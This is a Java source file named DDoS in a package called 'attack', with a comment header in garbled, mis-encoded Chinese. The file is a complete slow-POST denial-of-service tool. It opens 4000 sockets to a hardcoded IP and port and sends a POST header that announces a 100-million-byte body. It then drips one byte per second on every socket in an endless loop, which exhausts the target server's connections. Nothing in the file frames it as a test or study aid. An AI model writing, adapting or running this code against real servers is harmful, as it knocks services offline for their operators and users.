package com.superbaman.attack;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;


/**  
 * ����ʱ�䣺2015��6��2�� ����10:07:37
 * ��Ŀ���ƣ�DDoS
 * @author wangyc  
 * @version 1.0
 * @since JDK 1.7.0_21  
 * �ļ����ƣ�Main.java  
 * ��˵����  
 */

public class DDoS {
	
	
	public static void main(String[] args){
		
			String HOST = "192.168.7.73";//192.168.245.46
			int    PORT = 7001;
			int    MAX = 4000;
			String header = "POST /a HTTP/1.1\r\n" +
		            		"HOST: " + HOST + "\r\n" +
		            		"Connection: keep-alive\r\n" +
		            		"Keep-Alive: 900\r\n" +
		            		"Content-Length: 100000000\r\n" +
		            		"Content_Type: application/x-www-form-urlencoded\r\n" +
		            		"Accept: *.*\r\n";
			try{
				List<Socket> clients = new ArrayList<Socket>();
				for(int i=0 ; i<MAX ; i++){
					Socket socket=new Socket(HOST,PORT);
					if(socket.isConnected()){
						clients.add(socket);
						socket.getOutputStream().write(header.getBytes());
					}
				}
				
				while(true){
					int k = 0;
					for(Socket socket:clients){
						socket.getOutputStream().write("a".getBytes());
						System.out.println("slow attck !" + k++);
					}
					Thread.sleep(1000);
				}
				
			}catch(Exception e) {
				System.out.println("Error"+e);
		
			}

	}

}

